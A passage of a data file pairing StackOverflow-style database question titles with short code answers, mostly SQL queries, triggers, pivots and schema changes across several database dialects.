      PtCView.MonthNumber = PtAView.MonthNumber AND
      PtCView.CallType = PtAView.CallType
"
38993,56955,Set data only if there is a Date value,"     SELECT 
            mc.equipment as equipment
          , CONVERT (DATE, mc.CreatedOn)  as Data
          ,  sum(mc.quantity) as Production
          , tc.PlannedProduction as ProductionPlanned
          , ABS((sum(mc.quantity) - tc.PlannedProduction)) as ProductionVSPlanned
    FROM 
        AT_MACHINE_COUNTER mc LEFT JOIN
        TC_PlannedProduction tc ON 
            mc.equipment = tc.Workcenter AND
            CONVERT (DATE, mc.CreatedOn) = CONVERT (DATE, TC.PlannedDate) -- don't know if you need the second CONVERT() function
    WHERE 
      mc.CounterType = 1 
      and mc.CreatedOn between @DATA_START and  @DATA_END 
      and tc.PlannedDate between @DATA_START and  @DATA_END 
                  and mc.equipment = @MACHINE 
      and mc.CreatedOn IS NOT NULL
   GROUP BY CONVERT (DATE, mc.CreatedOn), mc.equipment, tc.PlannedProduction
"
39358,35105,SQL Query to get only those rows with only 1 value in another colum,"SELECT  ProjectID
FROM    table t1
        INNER JOIN (
          SELECT  ProjectID
          FROM    table
          WHERE   state = 21
        ) t2 ON t2.ProjectID = t1.ProjectID
GROUP BY
        ProjectID
HAVING  COUNT(*) = 1        
"
6859,39504,SQL query to export single data row to multiple CSV rows,"SELECT Ticket#, CustID, Account, 1 AS Line, ShipAttn, ShipAdd, ShipCity, ShipState, ShipZip, Part01 AS Part, Qty01 AS Qty
FROM   tbl
WHERE  Part01 IS NOT NULL

UNION ALL
SELECT Ticket#, CustID, Account, 2 AS Line, ShipAttn, ShipAdd, ShipCity, ShipState, ShipZip, Part02 AS Part, Qty02 AS Qty
FROM   tbl
WHERE  Part02 IS NOT NULL

UNION ALL ...

ORDER BY Ticket#, CustID, Account, Line
"
29855,19127,MySQL EXISTS and ORDER BY,"SELECT c.*
FROM comments c join
     (select l.commentId, MIN(likedate) as FirstLikeDate, MAX(likedate) as MaxLikeDate
      from likes l
      group by l.commentId
     ) l
     on c.commentId = l.CommentId
order by MaxLikeDate desc
"
9592,19019,How to select values from a table (SQL Server database) into a parameter (Stored Procedure)?,"CREATE PROCEDURE [dbo].ValidateStudent
(
    @UserName varchar(50),
    @Password varchar(50),
    @Yes_No int OUTPUT,
    @StudentId int OUTPUT
)
AS
    SET NOCOUNT ON;
SELECT        @StudentId = StudentId, @Yes_No = COUNT(1)
FROM            Student
WHERE        (UserName = @UserName) AND (Password = @Password)
GROUP BY StudentId
"
26856,35509,insert inserted id to another table,"create function a_ins() returns trigger as $$
begin
  insert into b (a_id) values (new.id);
  return null;
end;
$$ language plpgsql;

create trigger a_ins after insert on a
for each row execute procedure a_ins();
"
33514,26808,Select item type and its base type in SQL Server?,"DECLARE @itemType INT = 3;

WITH T(item1, itemType1, item2, itemType2 )
     AS (SELECT *
         FROM   @t T1
                LEFT JOIN @t T2
                  ON T1.item = T2.item
                     AND T2.itemType = 0
                     AND T1.itemType <> 0
         WHERE  T1.itemType = @itemType) 
SELECT item,
       itemType
FROM   T
       CROSS APPLY ( VALUES (item1, itemType1),
                            (item2, itemType2) ) v(item, itemType) 
WHERE item IS NOT NULL
"
12726,40920,How to chop string in SQL,"SUBSTRING(<string>,1,CHARINDEX(' ',<string)-1) + char(13)+char(10)+
RTRIM(SUBSTRING(<string>,CHARINDEX(' ',<string>)+1,99))
"
4102,66588,mySQL how can I restrict a query by a particular id when using multiple joins,"SELECT u.id, name AS user_name, phone, site_name, site_description, monitor_id, user_id, computer_id, site_id, computer_name, computer_description
FROM users AS u
JOIN
(
SELECT s.id, name AS site_name, description AS site_description, computer_id, user_id, computer_id, site_id, computer_name, computer_description
FROM sites AS s
JOIN
(
SELECT monitor_id, user_id, computer_id, site_id, computer_name, computer_description
FROM service_log AS sl 
JOIN 
(
   SELECT id, site_id, name AS computer_name, description AS computer_description
   FROM computers 
       #additional clause here
   WHERE id  IN ('123')
) 
AS c ON sl.computer_id = m.id) 
AS tab1 ON tab1.site_id = s.id) 
AS tab2 ON u.id = tab2.user_id
"
3794,71227,SQL Server - Get count for each pharmacy's outbound usage for each month,";WITH CTE AS
(
 select pharmacyid, count(*) as usage, month(datecalled) as [month]
 from outboundcalldata
 where datepart(year, datecalled) = 2014
 group by pharmacyid, YEAR(DateCalled), month(datecalled)
)
SELECT *
FROM CTE C
 PIVOT (SUM(usage)
        FOR [month]
        IN ([1],[2],[3],[4],[5],[6],[7],[8],[9],[10],[11],[12])
        )p
"
17587,44763,"over partition by without an aggregate function, avoiding group by","WITH myDate AS ( 
      SELECT name, rD
      FROM YourTable
      WHERE d = e
)
SELECT
       t.*, m.rD as expectedCol           
FROM YourTable t
JOIN myDate m
  ON t.name = m.name
"
17384,74700,lock a table in sql server 2008 after select,"SELECT TOP 10 * FROM Orders WITH(NOLOCK) where UserName = 'VadaVici'
"
17499,65001,Why do i get #### in the NUMBER column after format... Oracle?,"column fee format 999999999.99
"
35970,44420,How can I do the following query to get needed information,"SELECT 
    CL.CompId,
    CL.McID,
    CL.station,
    CL.slot,
    CL.subslot,
    BT.LineID,
    BT.McID     as BookingMcId, 
    BT.station  as BookingStation, 
    BT.slot     as BookingSlot, 
    BT.subslot  as BookingSubslot
FROM CompList as CL
JOIN BookingTable as BT ON BT.CompId = CL.CompId
"
25031,1806,Oracle PL/SQL Denomalised Results,"create view myview as
select c.car_id, c.make, c.model, WM_CONCAT(e.extra) as extras
from table_car c, table_car_extras_link l, table_extras e
where c.car_id=l.car_id and l.extra_id=e.extra_id
group by c.car_id;
"
8365,19100,How to replace non-numeric characters in MySQL?,"delimiter //

create function IF NOT EXISTS LeaveNumber(str varchar(50)) returns varchar(50)
no sql
begin
declare verification varchar(50);
declare result varchar(50) default '';
declare character varchar(2);
declare i integer default 1;

if char_length(str) > 0 then
    while(i <= char_length(str)) do
        set character = substring(str,i,1);
        set verification = find_in_set(character,'1,2,3,4,5,6,7,8,9,0');

        if verification > 0 then
            set result = concat(result,character);
        end if;

        set i = i + 1;

    end while;

return result;
else
return '';
end if;
end //


delimiter ;

select leaveNumber('fAX:-12abcDE234'); -- RESULT: 12234
"
23607,69065,ISDATE Validation issue 1753,"CASE WHEN ISDATE(ParamValue) = 1 AND ISNUMERIC(ParamValue) = 0
"
22931,64286,Self referencing table SQL Query to rows,"with test_dynamic as (
select 1 ide, 1 id_level, 'A01' code, 0 fk_ide from dual
union all select 2, 2, 'A01', 1 from dual
union all select 3, 3, 'A01', 2 from dual
union all select 4, 4, 'A01', 3 from dual
union all select 5, 2, 'A02', 1 from dual
union all select 6, 2, 'A03', 1 from dual
union all select 7, 3, 'A01', 6 from dual
union all select 8, 1, 'A02', 0 from dual
),
tree as (
select code, level lvl, sys_connect_by_path(code, '/') path, connect_by_isleaf lf, connect_by_root(ide) root_ide
from test_dynamic t
start with t.fk_ide = 0
connect by nocycle prior t.ide = t.fk_ide
)
select root_ide, path,
       regexp_substr(path, '[^/]+', 1, 1),
       regexp_substr(path, '[^/]+', 1, 2),
       regexp_substr(path, '[^/]+', 1, 3),
       regexp_substr(path, '[^/]+', 1, 4)
from tree where lf = 1;
"
7162,68967,Is there a Cascade delete option for localdb (mdf) in VS 2013,"CONSTRAINT [FK_Posts_PostTags] 
   FOREIGN KEY (Id) REFERENCES [PostTags]([PostId])
      ON UPDATE CASCADE
      ON DELETE CASCADE
"
9553,36890,Select a series of data where one or more instance breaches a threshold,"WITH DATASET
    AS (SELECT 489 AS PID, 0.3 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 264 AS PID, 32 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 489 AS PID, 0.3 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 264 AS PID, 22 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 489 AS PID, 0.3 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 489 AS PID, 0.2 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 264 AS PID, 17 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 489 AS PID, 0.1 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 489 AS PID, 0.2 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 264 AS PID, 4 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 489 AS PID, 0.3 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 489 AS PID, 0.3 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 264 AS PID, 42 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 489 AS PID, 0.5 AS PERCENTAGES FROM DUAL UNION ALL
        SELECT 264 AS PID, 52 AS PERCENTAGES FROM DUAL)
SELECT
      *
FROM
      DATASET B
WHERE
      B.PID IN (SELECT
                    A.PID
              FROM
                    DATASET A
              WHERE
                    A.PERCENTAGES > 50)
"
35768,11580,How can I populate a table from another with a look up for each row?,"INSERT INTO WordRelationship
SELECT DISTINCT a.WordId, b.WordId
FROM Temp t
INNER JOIN Word a
    ON t.HeaderWord = a.Word
INNER JOIN Word b
    ON t.OtherWord = b.Word
"
25011,68968,Most Efficient MySQL query to update a table from identical memory table,"INSERT 
    INTO <<master_table>> (Item1, Item2, cnt)
    SELECT Item1, Item2, cnt FROM <<memory_table>>
    ON DUPLICATE KEY UPDATE cnt = cnt + VALUES(cnt);
"
25489,48030,"Order Table by Column, but ignore if 0 - SQLite","SELECT * FROM tbl
ORDER BY CASE WHEN my_order = 0 THEN 1 ELSE 0 END,
my_order
"
22304,74525,Best way of handling if a>b in a case,"CASE WHEN ugt.Type = 'Permanent' 
     THEN (SELECT  cast(sum(pc.CommissionPerc / 100) as numeric(3,1))
           FROM Placements p INNER JOIN
                PlacementConsultants pc
                on pc.PlacementId = p.PlacementID AND pc.UserId = @userid INNER JOIN
                PlacementInvoices PlI
                on PlI.PlacementID = P.Placementid
           WHERE p.CreatedUserId = @userid AND
                 pli.CreatedOn <= GETDATE() AND
                 ((pli.CreatedOn >= DATEADD(MM, -6, GETDATE()) AND
                   ISNULL(ug.lastpromotion, u.CreatedOn) < DATEADD(MM, -6, GETDATE())
                  ) OR
                  (pli.ISNULL(ug.lastpromotion, u.CreatedOn) AND
                   ISNULL(ug.lastpromotion, u.CreatedOn) >= DATEADD(MM, -6, GETDATE())
                  )
                 )
"
33145,72220,"SQL Server : select distinct, but indicate whether another column is null?","SELECT  Key1,
        CASE WHEN MAX(Scheduled) IS NULL
            THEN 'False'
            ELSE 'TRUE'
        END AS IsAnyScheduled
FROM    tableName
GROUP   BY Key1
"
26070,44837,How to distinct sum() when using joins,"SELECT 
    DATE_FORMAT(date, '%Y-%m'), 
    SUM(ok.qty), 
    SUM(reject.qty), 
    ((SUM(reject.qty) / SUM(reject.qty + ok.qty))*100)as reject_percent
FROM ok
inner JOIN (Select Ok_Id,Sum(qty) as qty from Reject group by OK_id) as reject ON ok.id = reject.ok_id
GROUP BY DATE_FORMAT(date, '%Y-%m')
"
4906,53294,Multiple where clauses as dataset filters in SSRS,"  WHERE ((@variable = 1 AND c.CaseStatusCode = 'CS007')
         OR  (@variable = 2 AND c.caseStatusCode = 'CS006' AND j.Dispo IN ('CD002','CD003') AND c.CaseTypeCode = 'TY001')
         OR  (@variable = 3 AND  c.caseStatusCode = 'CS006' AND j.Dispo IN ('CD001') AND c.CaseTypeCode = 'TY001')
         OR  (@variable = 4 AND c.caseStatusCode = 'CS008' AND c.CaseTypeCode = 'TY001')
         OR  (@variable = 5 AND c.caseStatusCode = 'CS009' AND c.CaseTypeCode = 'TY001'))      
    AND ce.EventDT >= @startDate AND ce.EventDT < @endDate + 1
"
11357,35635,".bat file to merge .txt into one file, including filename but separated by a ';'","@echo off
(for %%f in (*.sdat) do (
  for /f ""delims="" %%a in (%%f) do @echo %%f;%%a
))>output.txt
"
17571,60360,Oracle - Case Statement,"with test(sales_number, sales_date, sales_amount) as 
(
select '001245JNF690864350', sysdate, 100 from dual union all
select 'SD895394KK9746K0000334', sysdate, 100 from dual union all
select '3850956789025417', sysdate, 100 from dual
)
select case
        when regexp_like(sales_number, '^0{1,}') /* starts with one or more zeros */ 
            then ltrim(sales_number, '0') /* remove leading zeros */
                 || sales_date ||sales_amount
        when length(sales_number) = 16
            then substr(sales_number, -9) /* last 9 chars */
                 || sales_date ||sales_amount
        else
            '' /* what to do here? */ 
    end
from test
"
18724,3236,Export Old SQL table data as UPDATE for New Table (for WHERE id 's is the same),"Update newTable nT
inner join oldTable oT
ON (nT.id=oT.id)
set nT.tell = oT.tell, nT.email=oT.email
"
30868,42420,Simple Oracle query: literal does not match format string,"to_date('01-01-2011','DD-MM-YYYY');
"
22286,14756,How to update a Postgres table with a join statement?,"update t1 set t1.column1 = 'changed'
where not exists (select 1 from t2 where t1.dataid = t2.dataid and t2.column2='foo');
"
7204,67514,Django's ManyToMany Relationship with Additional Fields,"from django.db import models

class Person(models.Model):
    name = models.CharField(max_length=128)

    def __str__(self):              # __unicode__ on Python 2
        return self.name

class Group(models.Model):
    name = models.CharField(max_length=128)
    members = models.ManyToManyField(Person, through='Membership')

    def __str__(self):              # __unicode__ on Python 2
        return self.name

class Membership(models.Model):
    person = models.ForeignKey(Person)
    group = models.ForeignKey(Group)
    date_joined = models.DateField()
    invite_reason = models.CharField(max_length=64)
"
7101,24423,INSERT based on another columns value,"UPDATE TEST_SURVEY
SET XYZ_RCVD = CASE WHEN XYZ_NAME IS NOT NULL THEN 'Y' ELSE 'N' END;
"
7876,18474,How can you use COUNT() in a comparison in a SELECT CASE clause in Sql Server?,"SELECT CASE WHEN COUNT(ID) >=1 THEN 1 WHEN COUNT (ID) <1 THEN 0 END FROM table WHERE Column2=4
"
39715,18835,UNION ALL two SELECTs with different column types - expected behaviour?,"create table ""tab1"" (""c1"" varchar(max));
create table ""tab2"" (""c3"" integer);
insert into tab1 values(N'asd'), (N'qweqwe');
insert into tab2 values(123), (345);
select
c_newname as myname
from
(
select ""c1"" as c_newname from ""tab1""
union all
select cast(""c3""  as varchar(max)) from ""tab2""
) as T_UNI;
"
26098,58640,Returning the order number of sub-string in a text,"select (case when source_column like '%'||param||'%'
             then 1 +
                  coalesce(length(substr(source_column, 1, instr(source_column, param) - 1)) -
                           length(replace(substr(source_column, 1, instr(source_column, param) - 1), '_', '')),
                           0)
              else 0
        end) as pos
from t;
"
35765,68122,Netezza SQL: Specify an offset in a window frame,"sum(sales) over (partition by household_id
                 order by week_id
                 rows between 34 preceding and 8 preceding
                ) as x34
"
23692,37848,Update database from another using joins?,"UPDATE  a
SET     a.SpeakerID = b.colName          -- SET valoue here
FROM    Database1.dbo.Sessions a
        INNER JOIN Database2.dbo.Sessions b
            ON a.SessionID = b.SessionID -- assumes that their 
                                         -- relationship column is SessionID, 
                                         -- change it in your original columnName
WHERE   ....
"
36933,29195,Join two table by one-to-one table when not all keys present in one-to-one table,"select m.name, a.name
from menu m
left join menuact ma
    on m.id = ma.menu_id
left join action a
    on ma.action_id = a.id
"
12671,27501,GROUP BY and COUNT different fields,"select code, 
       sum(iif(type='A', 1, 0) as countA,
       sum(iif(type='B', 1, 0) as countB
from your_table
group by code
"
194,61950,multi-table query when there is no record in one table,"select a.id, 
  a.name, 
  count(b.id) as contact_email_total_count
from tablea a
left join tableb b
  on a.id = b.id
group by a.id, a.name
"
38087,31655,"create a table named ""select"" in SQL databases","CREATE TABLE ""SELECT"" ...
"
29247,31700,SQL filtering records by unique column using WHERE clause only,"PersonId IN (SELECT MAX(PersonId) FROM table1 GROUP BY city)
"
26560,11581,MySql looping inside a stored procedure,"UPDATE Table t1
JOIN Table t2
ON FIND_IN_SET(t1.id, t2.vals)
SET t1.total = t1.total  + 1
WHERE t2.id = 4
"
533,5730,Count rows per hour in SQL Server with full date-time value as result,"SELECT dateadd(hour, datediff(hour, 0, TimeStamp), 0) as TimeStampHour, Count(*)
FROM [TEST].[dbo].[data]
GROUP BY dateadd(hour, datediff(hour, 0, TimeStamp), 0)
ORDER BY dateadd(hour, datediff(hour, 0, TimeStamp), 0);
"
4406,1905,equivalent date_part function in sas,"data have;
 timestamp='01JAN2012:08:48'dt;
run;

proc sql;
 select datepart(timestamp) format=mmddyy10., 
 timepart(timestamp) format=time.,
 month(datepart(timestamp)),
 year(datepart(timestamp))
 into :date , :time, :month, :year
 from have;
quit;

%put DATE: &date;
%put TIME: &time;
%put MONTH: &month;
%put YEAR: &year;
"
8382,20785,"How to identify high-load SQL in Oracle, using oracle views?","select a.sql_id, a.ratio, a.executions
from  
(
  select sql_id, buffer_gets / executions ratio, executions
  from v$sql
  where executions > 10
  order by 2 desc
) a
where rownum <= 10
"
14684,61081,MySQL INNER JOIN from second table (TOP10),"$stmt = $conn->prepare('SELECT  a.*, 
    IFNULL((SELECT SUM(amount) FROM bankaccounts b WHERE b.owner=a.id),0) AS BANK_MONEY,
    (IFNULL(a.money,0) + IFNULL((SELECT SUM(amount) FROM bankaccounts c WHERE c.owner=a.id),0)) AS ARESULT
    FROM users a 
    ORDER BY ARESULT DESC LIMIT 0, 10');
"
31847,14690,SQL Server Select Join?,";WITH CTE1 AS
(   SELECT  ID, Value1, ROW_NUMBER() OVER(ORDER BY Value1) [RowNumber]
    FROM    t1
), CTE2 AS
(   SELECT  ID, Value2, ROW_NUMBER() OVER(ORDER BY Value2) [RowNumber]
    FROM    t2
)
SELECT  COALESCE(CTE1.ID, CTE2.ID) [ID],
        Value1,
        Value2
FROM    CTE1
        FULL JOIN CTE2
            ON CTE1.ID = CTE2.ID
            AND CTE1.RowNumber = CTE2.RowNumber
"
21245,67005,select with multiple where condition in sql server,"select Sno, col1, col2, col3, col4
  from YOUR_TABLE
 WHERE col1 BETWEEN -10 AND 100
   and col2 BETWEEN -10 AND 100
   and col3 BETWEEN -10 AND 100
   and col4 BETWEEN -10 AND 100
"
31223,52885,Change the date format in SQLServer,"SELECT
    convert(varchar, MAX(myDate), 101) AS DateToUser
FROM 
    blaTable
"
2304,22820,Android sql query using WHERE clause,"private static String WHERE = ""DATE like ?"";
db.query(table, columns, WHERE , new String[] { datePickerDate }, groupBy, having, orderBy)
"
12497,13350,removing duplicates in ms access,"SELECT number, count(number) AS count
FROM table
GROUP BY number
"
30564,52254,SQL Server - RegEx - Filtering rows with junk characters,"WHERE Col2  LIKE N'%[^0-9A-Za-z .,;:]%' collate Latin1_General_BIN
"
33908,52798,Combining rows of data with the same date,"SELECT R.[Name], P.[Name], S.[Number], T.[Name],
   sum(CASE WHEN DatePart(dw, D.ActivityDate) = 1 THEN D.[Hours] ELSE 0 END) AS Monday,
   sum(CASE WHEN DatePart(dw, D.ActivityDate) = 2 THEN D.[Hours] ELSE 0 END) AS Tuesday,
   sum(CASE WHEN DatePart(dw, D.ActivityDate) = 3 THEN D.[Hours] ELSE 0 END) AS Wednesday,
   sum(CASE WHEN DatePart(dw, D.ActivityDate) = 4 THEN D.[Hours] ELSE 0 END) AS Thursday,
   sum(CASE WHEN DatePart(dw, D.ActivityDate) = 5 THEN D.[Hours] ELSE 0 END) AS Friday,
   sum(CASE WHEN DatePart(dw, D.ActivityDate) = 6 THEN D.[Hours] ELSE 0 END) AS Saturday,
   sum(CASE WHEN DatePart(dw, D.ActivityDate) = 7 THEN D.[Hours] ELSE 0 END) AS Sunday
FROM DailyTaskHours D
INNER JOIN Task T ON D.TaskId = T.PK_Task
INNER JOIN Story S ON T.StoryId = S.PK_Story
INNER JOIN Sprint P ON S.SprintId = P.PK_Sprint
INNER JOIN Product R ON P.ProductId = R.PK_Product
GROUP BY R.[Name], P.[Name], S.[Number], T.[Name] 
"
11909,25641,CouchDB include document in index if count of array field is greater than 0,"{""_id"": ""_design/geodd"",
 ""_rev"": ""5-2729b1453b11f81261ddb3cf3f3de72f"",
 ""st_indexes"": {
  ""geoidx"": {
   ""index"": ""function(doc) {if (doc.geometry && doc.geometry.coordinates && isArray(doc.color) && doc.color.length == 0) {st_index(doc.geometry);}}""
  }
 }
}
"
33748,42045,SqlServer - Concatenate an integer,"DECLARE @Your_Number INT = 24;

SELECT CAST(RIGHT(YEAR(GETDATE()), 2) AS NVARCHAR(2)) 
          + RIGHT('000000000' + CAST(@Your_Number AS NVARCHAR), 4)  --<-- This 4

RESULT: 140024
"
28826,37802,How to get the count of rows in a column between a range in a sql table,"Select COUNT(*)
FROM yourTable
WHERE columnName >=5 and columnName <=9
"
22119,30122,Django ORM - LEFT JOIN Table2 ON Table2.Column = 123,"from django.db.models import Q, Value as V
from django.db.models.functions import Coalesce

objects = Table1.objects.filter(
              Q(table2__isnull=True) | Q(table2__user=11),
              id=1
          ).annotate(
              num=Coalesce('table2__num', V(0))
          ).values('id', 'num')
"
5403,25194,How can I rename my column in a SQL table?,"sp_rename 'TableName.ColumnName', 'NewColumnName', 'COLUMN'
"
39874,55911,SQL query with 3 tables,"select project.projectid, project.name, managers.username, project.duedate, task.workerid from project 
inner join task on project.projectid = task.projectid
inner join user as managers on project.projectmanagerid = managers.userid
inner join user as workers on task.workerid = workers.userid
"
39864,13139,Drop all columns from table in Rails migration,"class PurgeOldUsersSchema < ActiveRecord::Migration
  def change
    cols = []
    User.columns.collect(&:name).each do |col|
     cols.push(col.to_sym)
    end
    cols = cols - [:id]
    remove_column :users, cols
  end
end
"
33653,32754,In SQL can you GRANT privileges to MULTIPLE accounts with a single command?,"REVOKE
    priv_type [(column_list)]
      [, priv_type [(column_list)]] ...
    ON [object_type] priv_level
    FROM user [, user] ...

REVOKE ALL PRIVILEGES, GRANT OPTION
    FROM user [, user] ...
"
15418,8872,Remove duplicate data in 'date-ranged' rows,";with cte as (
select m1.ID, m1.StartDate, m1.EndDate, m1.a, m1.b, m1.c, m1.d, m1.e, m1.f
from sampledata m1
where not exists
(select null from sampledata m0
 where m1.ID = m0.ID and 
       m1.a = m0.a and 
       m1.b = m0.b and 
       m1.c = m0.c and 
       m1.d = m0.d and 
       m1.e = m0.e and 
       m1.f = m0.f and 
       dateadd(day, -1, m1.StartDate) = m0.EndDate)
union all
select m1.ID, m1.StartDate, m2.EndDate, m1.a, m1.b, m1.c, m1.d, m1.e, m1.f
from cte m1
join sampledata m2 
       on m1.ID = m2.ID and 
          m1.a = m2.a and 
          m1.b = m2.b and 
          m1.c = m2.c and 
          m1.d = m2.d and 
          m1.e = m2.e and 
          m1.f = m2.f and 
          dateadd(day, 1, m1.EndDate) = m2.StartDate)
select ID, StartDate, max(EndDate) EndDate, a, b, c, d, e, f
from cte 
group by ID, StartDate, a, b, c, d, e, f
OPTION (MAXRECURSION 32767)
"
10911,72341,Handling Multiple Databases in Laravel,"User::connection('another-connection-name')->where('email', 'john@doe.com')->first();
"
22513,42168,IF statement in WHERE clause with Oracle SQL on count,"SELECT COUNT(*) AS count
FROM iam.credential
WHERE (iam.credential.CREDENTIAL_TYPE = :1
OR (iam.credential.CREDENTIAL_TYPE is null AND :1 is null))
AND (iam.credential.CREDENTIAL_NAME = :2
OR (iam.credential.CREDENTIAL_NAME is null AND :2 is null))
AND ...
"
34054,18850,SQL query that returns specific string if column is null?,"SELECT COALESCE(email, 'Unknown')
FROM   customers
"
39732,20798,"MYSQL Date field showing random numbers, how to work out date?","mysql> SELECT FROM_UNIXTIME(1321443614) AS time;
+---------------------+
| time                |
+---------------------+
| 2011-11-16 11:40:14 |
+---------------------+
1 row in set (0.00 sec)
"
14864,65233,How to count records in multiple tables containing the same column?,"    --To get the List of Table having the required column and Storing them into Temp Table.
Select ID = IDENTITY(Int,1,1),Object_Name(object_id) As TableName Into #ReqTables
From sys.columns where name = 'Crets'

    --Creating Table to Store Row count result.
Create Table #RowCounts
(
    Row_Count Int
    , UserID Int
)

    --Declaring variables
Declare @min Int,@max int,@TableName Nvarchar(255)
    --get min and Max values from Required table for looping
Select @min = Min(Id),@max = Max(ID) From #ReqTables

    --loop through Min and Max
While(@min <= @max)
BEgin
        --get the table for a given loop Counter
    Select @TableName = tableName From #ReqTables Where Id = @min
        --Executing the Dynamic SQl
    Exec ('Insert Into #RowCounts (Row_Count,UserID) Select Count(*),UserID From ' + @TableName + ' Group by UserID')
        --incrementing the Counter
    Set @min = @min + 1
End
"
13452,60767,SQL - Unable to Convert a string in to YYYYMMDD format,"select convert(varchar(8), convert(datetime, 
    substring(
        @data.value('(/ActiveService/@TimePeriod)[1]','nvarchar(50)'), 29, 10
    ), 120), 112)
"
36249,73471,saving the FOR XML AUTO results to variable in SQL,"DECLARE @xml_var XML  
SET @xml_var =  
(
  SELECT   *,
    (  
      SELECT *

      FROM Orders

      WHERE Orders.CustomerID=Customers.CustomerID

      FOR XML AUTO, TYPE

    )

  FROM Customers WHERE CustomerID='ALFKI'

  FOR XML AUTO, TYPE

)
"
24081,243,Easiest way to change an Primary Key from a string to a number,"alter table MODULE_SESSIONS drop constraint FK_MODULE_MODULE_SESSION_FK1;
alter table MODULES drop constraint MODULES_PK;
alter table MODULES rename column ID to OLD;
alter table MODULES add ID INTEGER;
update MODULES set ID = OLD;
alter table MODULES drop column OLD;
alter table MODULE_SESSIONS rename column MODULE_ID to OLD;
alter table MODULE_SESSIONS add MODULE_ID INTEGER;
update MODULE_SESSIONS set MODULE_ID = OLD;
alter table MODULES add constraint MODULE_PK primary key(ID); 
alter table MODULE_SESSIONS add constraint FK_MODULE_MODULE_SESSION_FK1 foreign key(MODULE_ID) references MODULES(ID);
alter table MODULE_SESSIONS drop column OLD;
"
31201,27084,"Elixir/SQLAlchemy equivalent to SQL ""LIKE"" statement?",">>> Note.query.filter(Note.message.like(""%somestr%"")).all()
[]
"
22008,55608,Find duplicate rows in database,"SELECT GROUP_CONCAT(first_name SEPARATOR ' ')
FROM table
GROUP BY last_name
HAVING COUNT(first_name) > 1
"
31891,60415,SELECT TOP(N) Rows For Each GROUP,"WITH X 
AS
(
    SELECT 
       [Id], [HotelName], [StarRating], [Description], 
       [CheckinDate], [CheckoutDate], [Price], [ImageUrl], 
       ROW_NUMBER() OVER(PARTITION BY [StarRating] ORDER BY [Id]) AS Num
    FROM 
       [dbo].[Hotel]
    WHERE 
       [CityId] = @CityId 
         AND CheckinDate > GETDATE()
         AND [StarRating] IN (3, 4, 5)
) 
SELECT 
   [Id], [HotelName], [StarRating], [Description], 
   [CheckinDate], [CheckoutDate], [Price], [ImageUrl]
FROM 
   X
WHERE 
   Num <= 2
"
22507,51939,Creating random string of characters only in TSQL,"DECLARE @NewId nvarchar(45)
set @NewId = newid()

SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(@NewId, 1, 'A'), 2, 'B'), 3, 'C'), 4, 'D'), 5, 'E'), 6, 'F'), 7, 'G'), 8, 'H'), 9, 'I'), 0, 'L'), '-', 'M')
"
35562,29138,Adding new column after column and defining a default,"alter table pageareas add content_userDefined BIT( 1 ) NULL after content;
alter table pageareas alter content_userDefined set default 0;
"
8166,16894,How to create a query to list all combinations possibilities,"SELECT
   CCY1, CCY2, CER.Exchange_Rate
FROM
    ( 
    SELECT
        c1.rec_id AS rec_id1, c1.currency AS CCY1,
        c2.rec_id AS rec_id2, c2.currency AS CCY2
    FROM
        currency c1
        CROSS JOIN --all combinations...
        currency c2
    WHERE
        c1.rec_id <> c2rec_id -- ...removes same pairs
    ) foo
    LEFT JOIN -- ...get matching FX pairs
    CurrencyExchangeRate CER ON foo.rec_id1 = cer.[from] AND foo.rec_id2 = cer.[to]
"
15403,28491,Aggregate function within inner select in Pivot query using SQL Server,"set @query = 'SELECT slno,totalproduct,' + @cols + ' 
    from 
    (
        select p.slno slno, c.count as totalproduct, p.item
        from product p
        inner join 
        (select slno, count(item) count
         from product 
         group by slno) c on p.slno = c.slno
    ) x
    pivot 
    (
        count(item)
        for item in (' + @cols + ')
    ) p '
"
5990,18084,Simple join with maximum per group?,"SELECT t.id, t.userid, t.time FROM (
  SELECT h1.*, COUNT(*) pos FROM hits h1
    LEFT JOIN hits h2
      ON h2.userid = h1.userid AND h2.time <= h1.time
  GROUP BY
    h1.userid, h1.time) t
WHERE pos <= 2;
"
33632,45529,"How to identify the operation type(insert,update,delete) in SQL Server trigger","DECLARE @event_type varchar(42)
IF EXISTS(SELECT * FROM inserted)
  IF EXISTS(SELECT * FROM deleted)
    SELECT @event_type = 'update'
ELSE
    SELECT @event_type = 'insert'
ELSE
  IF EXISTS(SELECT * FROM deleted)
    SELECT @event_type = 'delete'
  ELSE
    --no rows affected - cannot determine event
    SELECT @event_type = 'unknown'
"
16410,9673,SQL query to return records that are exclusively of one type,"SELECT *
FROM ExampleTable
WHERE LinkID NOT IN 
(
    SELECT LinkID
    FROM ExampleTable
    WHERE LinKType != 'A'
)
"
1401,27002,One-To-Many reflexive association INSERT data,"-- CmsCategories: Disable constraint one-to-many reflexive association to add first row
    ALTER TABLE dbo.CmsCategories
    NOCHECK
    CONSTRAINT
    FK_CmsCategories_ParentOf;

    ---- CmsCategories: Insert first row - Root value
    INSERT INTO dbo.CmsCategories
    (Title, MetaDescription, MetaKeyword, Summary, IsPublished, ParentOf)
    VALUES
    ('Homepage','Homepage','Homepage','Homepage',1,0);

    -- CmsCategories: Enable constraint one-to-many reflexive association
    ALTER TABLE dbo.CmsCategories
    CHECK
    CONSTRAINT
    FK_CmsCategories_ParentOf;
"
4708,68711,SQL Query Syntax Error - Spaces in Field Names,"SELECT * FROM [OV2 BAS] AS bas INNER JOIN [OV2 RefID] AS ids ON bas.[Ref ID] = ids.[Ref ID] WHERE ids.ENUM_H = 'TDischarge';
"
21623,52201,Insert and alter in one statement,"create table #Stuff (
  Id int identity(1001, 1) primary key clustered, 
  Beep int unique,
  Boop nvarchar(50),
  Baap nvarchar(50)
);

INSERT  INTO #Stuff VALUES (1,'boop', 'poop');
INSERT  INTO #Stuff VALUES (2,'beep', 'peep');

SELECT * FROM #STUFF;

MERGE #Stuff 
